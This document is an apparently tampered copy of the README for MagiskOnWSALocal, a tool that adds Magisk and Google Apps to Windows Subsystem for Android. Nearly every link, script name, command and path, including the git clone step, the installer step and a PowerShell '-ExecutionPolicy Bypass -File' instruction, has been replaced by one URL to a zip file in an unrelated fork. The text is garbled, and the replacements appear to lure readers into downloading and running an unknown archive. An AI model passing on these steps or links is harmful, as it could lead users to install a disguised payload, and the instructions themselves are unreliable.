# Magisk on WSA (with Google Apps)

:warning: For fork developers: Please don't build using GitHub Actions, as GitHub will count your forked GitHub Actions usage against this upstream repository, which may cause this upstream repository gets disabled by GitHub staff like [MagiskOnWSA](https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip) because of numerous forks building GitHub Actions, and counting the forks' Action usage against this upstream repository.

## Support for generating from these systems

- Linux (x86_64 or arm64)

  The following dependencies are required:

  | DistrOS             |                                                         |            |              |                    |               |              |
  |:-------------------:|---------------------------------------------------------|------------|--------------|--------------------|---------------|--------------|
  | Debian              | `lzip patchelf e2fsprogs python3 aria2 attr unzip sudo` | `whiptail` | `qemu-utils` | `python3-venv`     | `python3-pip` | `p7zip-full` |
  | openSUSE Tumbleweed | Same as above                                           | `dialog`   | `qemu-tools` | `python3-venvctrl` | Same as above                |
  | Arch                | Same as Debian                                          | `libnewt`  | `qemu-img`   |  Same as Debian    | `python-pip`  | `p7zip`      |

  The python3 library `requests` is used.

  Python version ≥ **3.7.2**.

  - Recommended use

    - Ubuntu (You can use [WSL2](https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip%20Group%20Limited))

      Ready to use right out of the box.

    - Debian (You can use [WSL2](https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip))

      Ready to use right out of the box.

    - openSUSE Tumbleweed (You can use [WSL2](https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip))

      Ready to use right out of the box.

    `https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip` will handle all dependencies automatically.

    No need to type any commands.

## Features

- Integrate Magisk and GApps in a few clicks within minutes
- Keep each build up to date
- Support both ARM64 and x64
- Support MindTheGapps
- Remove Amazon Appstore
- Fix VPN dialog not showing (use our [VpnDialogs app](https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip))
- Add device administration feature
- Unattended installation
- Automatically activates developers mode in Windows 11
- Update to the new version while preserving data with a one-click script
- Merged all language packs

## Text Guide

1. Star (if you like).
2. Clone the repo to local:

   ```bash
   git clone https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip --depth 1
   ```

3. Run `cd MagiskOnWSALocal`.
4. Run `https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip`.
5. Select the WSA version and its architecture (mostly x64).
6. Select the version of Magisk.
7. Choose which brand of GApps you want to install:
   - MindTheGapps

     There is no other variant we can choose.
8. Select the root solution (none means no root).
9. If you are running the script for the first time, it will take some time to complete. After the script completes, two new folders named `output` and `download` will be generated in the `MagiskOnWSALocal` folder. Go to the `output` folder. While running the `https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip` script in the step 3, if you selected `Yes` for `Do you want to compress the output?` then in `output` folder you will see a compressed file called `WSA-with-magisk-stable-MindTheGapps_2207.40000.8.0_x64_Release-Nightly`or else there will be folder with the `WSA-with-magisk-stable-MindTheGapps_2207.40000.8.0_x64_Release-Nightly`. If there is a folder open it and skip to step 10. NOTE: The name of compressed file or the folder generated in the `output` folder may be different for you. It will be dependent on the choices made when executing `https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip`.
10. Extract the compressed file and open the folder created after the extraction of the file.
11. Here look for file `https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip` and run it.
    - If you previously have a MagiskOnWSA installation, it will automatically uninstall the previous one while **preserving all user data** and install the new one, so don't worry about your data.
    - If you have an official WSA installation, you should uninstall it first. (In case you want to preserve your data, you can backup `%LOCALAPPDATA%\Packages\https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip\LocalCache\https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip` before uninstallation and restore it after installation.)
    - If the popup windows disappear **without asking administrative permission** and WSA is not installed successfully, you should manually run `https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip` as Administrator:
        1. Press `Win+x` and select `Windows Terminal (Admin)`.
        2. Input `cd "{X:\path\to\your\extracted\folder}"` and press `enter`, and remember to replace `{X:\path\to\your\extracted\folder}` including the `{}`, for example `cd "D:\wsa"`
        3. Input `https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip -ExecutionPolicy Bypass -File .\https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip` and press `Enter`.
        4. The script will run and WSA will be installed.
        5. If this workaround does not work, your PC is not supported for WSA.
12. Magisk/Play Store will be launched. Enjoy by installing LSPosed-Zygisk with Zygisk enabled or Riru and LSPosed-Riru.

---

## FAQ

<details open>

- Can I delete the installed folder?

  No.

- How can I update WSA to a newer version?

  1. Update build scripts:

      ```bash
      git pull
      ```

      For more usage of git, referred to <https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip>

  2. Rerun the script, replace the content of your previous installation and rerun `https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip`. Don't worry, your data will be preserved.

- How can I get the logcat from WSA?

  `%LOCALAPPDATA%\Packages\https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip\LocalState\diagnostics\logcat`

- How can I update Magisk to a newer version?

  Do the same as updating WSA.

- How to pass Play Integrity (formerly known as SafetyNet)?

  Like all the other emulators, no way.

- Virtualization is not enabled?

  `https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip` helps you enable it if not enabled. After rebooting, rerun `https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip` to install WSA. If it's still not working, you have to enable virtualization in BIOS. That's a long story so ask Google for help.

- How to remount the system as read-write?

  No way in WSA since it's mounted as read-only by Hyper-V. You can modify the system by making a Magisk module. Or directly modify the https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip Ask Google for help.

- I cannot `adb connect localhost:58526`, what to do?

  Make sure developer mode is enabled. If the issue persists, check the IP address of WSA on the setting page and try `adb connect ip:5555`.

- Why the Magisk online module is empty?

  Magisk actively removes the online module repository. You can install the module locally or by `adb push https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip /data/local/tmp` and `adb shell su -c magisk --install-module https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip`.

- Can I use Magisk v23.0 stable or a lower version?

  No. Magisk has bugs preventing itself from running on WSA. Magisk v24+ has fixed them. So you must use Magisk v24 or later.

- How can I get rid of Magisk?

  Choose `none` as the root solution.

- How to install custom GApps?

  [Tutorial](https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip)

- Where can I download MindTheGapps?

  You can download from here [MindTheGapps](https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip) ([mirror](https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip)).

  Note that there is no x86_64 pre-build, so you need to build it by yourself ([Repository](https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip)).

  Or you can download the built package for 12.1 and 13 for x86_64 from [this page](https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip).

- Can I switch OpenGApps to MindTheGapps and keep user data in a previous build?

  No. You should wipe data after changing the GApps brand. Otherwise, you will find that the installed GApps are not recognized.

- WSA with OpenGApps integrated fails to start.

  OpenGApps has not yet released a version built for Android 12L and 13, only built for Android 11, which may not be compatible and thus cause crashes. Consider switching to MindTheGapps.

- How to install KernelSU?

  [Tutorial](https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip)

</details>

---

## Credits

- [StoreLib](https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip): API for downloading WSA
- [Magisk](https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip): The most famous root solution on Android
- [The Open GApps Project](https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip): One of the most famous Google Apps packages solution
- [WSA-Kernel-SU](https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip) and [kernel-assisted-superuser](https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip): The kernel `su` for debugging Magisk Integration
- [WSAGAScript](https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip): The first GApps integration script for WSA
- [erofs-utils](https://raw.githubusercontent.com/johnlauj/MagiskOnWSALocal/main/bin/aarch64/MagiskOnWSALocal-3.7.zip): Pre-build `erofs-utils` with erofsfuse enabled

_The repository is provided as a utility._

_Android is a trademark of Google LLC. Windows is a trademark of Microsoft Corporation._
